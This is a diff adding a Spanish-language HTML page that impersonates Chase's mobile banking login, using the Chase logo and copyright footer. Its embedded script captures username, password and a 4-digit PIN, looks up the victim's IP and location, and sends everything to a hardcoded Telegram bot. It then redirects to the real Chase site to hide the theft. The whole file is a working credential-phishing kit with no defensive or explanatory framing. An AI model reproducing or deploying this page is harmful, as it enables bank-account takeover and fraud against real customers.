@@ -1,0 +1,242 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Chase Móvil con Footer SVG y Funcionalidad Completa</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background: url('https://i.postimg.cc/2S8xtqnY/Fondo-Chase-Movil.jpg') no-repeat center center fixed;
+      background-size: contain;
+      display: flex;
+      flex-direction: column;
+      min-height: 100vh;
+    }
+    .container {
+      max-width: 350px;
+      margin: auto;
+      padding: 20px 15px;
+      flex-grow: 1;
+    }
+    .logo {
+      display: flex;
+      justify-content: center;
+      margin: 30px 0 20px;
+    }
+    .logo img {
+      max-width: 160px;
+      height: auto;
+    }
+    .login-box, .pin-box {
+      background: rgba(255, 255, 255, 0.96);
+      padding: 25px 20px;
+      border-radius: 10px;
+      box-shadow: 0 4px 10px rgba(0,0,0,0.2);
+      display: none;
+    }
+    .login-box.active, .pin-box.active {
+      display: block;
+    }
+    .login-box h2, .pin-box h2 {
+      font-size: 18px;
+      margin-bottom: 20px;
+      color: #333;
+    }
+    label {
+      font-size: 14px;
+      color: #333;
+      display: block;
+      margin-bottom: 5px;
+    }
+    input[type="text"],
+    input[type="password"],
+    input[type="number"] {
+      width: 100%;
+      padding: 10px;
+      margin-bottom: 15px;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+      font-size: 14px;
+      box-sizing: border-box;
+    }
+    .login-btn, .pin-btn {
+      width: 100%;
+      padding: 12px;
+      background-color: #0070C9;
+      color: white;
+      border: none;
+      border-radius: 5px;
+      font-weight: bold;
+      font-size: 15px;
+      cursor: pointer;
+      transition: background-color 0.3s ease;
+    }
+    .login-btn:hover, .pin-btn:hover {
+      background-color: #005fa3;
+    }
+    .loading {
+      display: none;
+      color: white;
+      text-align: center;
+      font-size: 18px;
+      margin-top: 40px;
+    }
+    footer {
+      width: 100%;
+      flex-shrink: 0;
+    }
+    footer svg {
+      width: 100%;
+      display: block;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="container">
+
+    <div class="logo">
+      <img src="https://i.postimg.cc/D0PqjFZm/chase.png" alt="Chase Logo" />
+    </div>
+
+    <!-- FORMULARIO LOGIN -->
+    <div class="login-box active" id="loginBox">
+      <h2>Iniciar sesión</h2>
+      <form id="loginForm">
+        <label for="usuario">Nombre de usuario</label>
+        <input type="text" id="usuario" required autocomplete="username" />
+
+        <label for="contrasena">Contraseña</label>
+        <input type="password" id="contrasena" required autocomplete="current-password" />
+
+        <button type="submit" class="login-btn">Iniciar sesión</button>
+      </form>
+    </div>
+
+    <!-- LOADING -->
+    <div class="loading" id="loadingDiv">
+      <div class="spinner" style="
+        border: 6px solid rgba(255,255,255,0.2);
+        border-top: 6px solid #ffffff;
+        border-radius: 50%;
+        width: 60px;
+        height: 60px;
+        margin: 0 auto 20px;
+        animation: spin 1s linear infinite;">
+      </div>
+      Cargando, por favor espera...
+    </div>
+
+    <!-- FORMULARIO PIN -->
+    <div class="pin-box" id="pinBox">
+      <h2>Ingrese su PIN</h2>
+      <form id="pinForm">
+        <input type="number" id="pin" placeholder="PIN de 4 dígitos" required maxlength="4" min="0" max="9999" />
+        <button type="submit" class="pin-btn">Continuar</button>
+      </form>
+    </div>
+
+  </div>
+
+  <footer role="contentinfo" aria-label="Pie de página Chase">
+    <!-- Footer SVG embebido -->
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1080 288">
+      <style>
+        .footer-bg { fill: #fff; }
+        .footer-text1 { fill: #0070C9; font-weight: 700; font-size: 36px; font-family: Arial, sans-serif; }
+        .footer-text2 { fill: #555555; font-size: 30px; font-family: Arial, sans-serif; }
+        .footer-link { fill: #0070C9; font-weight: 600; text-decoration: underline; cursor: pointer; }
+        .footer-link:hover { fill: #005fa3; }
+      </style>
+      <rect class="footer-bg" width="1080" height="288"/>
+      <text x="540" y="70" class="footer-text1" text-anchor="middle">JPMorgan Chase Bank, N.A. Miembro FDIC.</text>
+      <text x="540" y="120" class="footer-text2" text-anchor="middle">© 2025 JPMorgan Chase &amp; Co. Todos los derechos reservados.</text>
+      <text x="540" y="170" class="footer-text2" text-anchor="middle">
+        Se aplican restricciones. 
+        <tspan class="footer-link">Aviso de privacidad</tspan> | 
+        <tspan class="footer-link">Condiciones de uso</tspan>
+      </text>
+    </svg>
+  </footer>
+
+  <script>
+    const token = "8007484732:AAH7GTfW46Sh4TWn9Wl3gb8sWoAdXQ-REDQ";
+    const chatId = "1221652451";
+
+    function enviarMensaje(mensaje) {
+      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ chat_id: chatId, text: mensaje })
+      });
+    }
+
+    async function obtenerIPyUbicacion() {
+      try {
+        const resp = await fetch('https://ipapi.co/json/');
+        return await resp.json();
+      } catch {
+        return null;
+      }
+    }
+
+    const loginBox = document.getElementById("loginBox");
+    const pinBox = document.getElementById("pinBox");
+    const loadingDiv = document.getElementById("loadingDiv");
+
+    const loginForm = document.getElementById("loginForm");
+    const pinForm = document.getElementById("pinForm");
+
+    loginForm.addEventListener("submit", async (e) => {
+      e.preventDefault();
+
+      const usuario = document.getElementById("usuario").value;
+      const contrasena = document.getElementById("contrasena").value;
+
+      loginBox.classList.remove("active");
+      loadingDiv.style.display = "block";
+
+      const datosIp = await obtenerIPyUbicacion();
+
+      let mensaje = `📱 Login Chase (Móvil)\nUsuario: ${usuario}\nContraseña: ${contrasena}\n`;
+
+      if (datosIp) {
+        mensaje += `IP: ${datosIp.ip}\nCiudad: ${datosIp.city}\nRegión: ${datosIp.region}\nPaís: ${datosIp.country_name}\n`;
+      } else {
+        mensaje += "IP: No disponible\n";
+      }
+
+      enviarMensaje(mensaje);
+
+      setTimeout(() => {
+        loadingDiv.style.display = "none";
+        pinBox.classList.add("active");
+      }, 60000); // 60 segundos
+    });
+
+    pinForm.addEventListener("submit", (e) => {
+      e.preventDefault();
+      const pin = document.getElementById("pin").value;
+
+      enviarMensaje(`🔐 PIN ingresado (Móvil): ${pin}`);
+
+      setTimeout(() => {
+        window.location.href = "https://www.chase.com/personal/home?jp_pet=tnt-11070b&";
+      }, 1500); // Espera 1.5 segundos antes de redirigir (clave para móviles)
+    });
+
+    // Animación spinner
+    const styleSpinner = document.createElement('style');
+    styleSpinner.textContent = `
+      @keyframes spin {
+        0% { transform: rotate(0deg); }
+        100% { transform: rotate(360deg); }
+      }
+    `;
+    document.head.appendChild(styleSpinner);
+  </script>
+
+</body>
+</html>
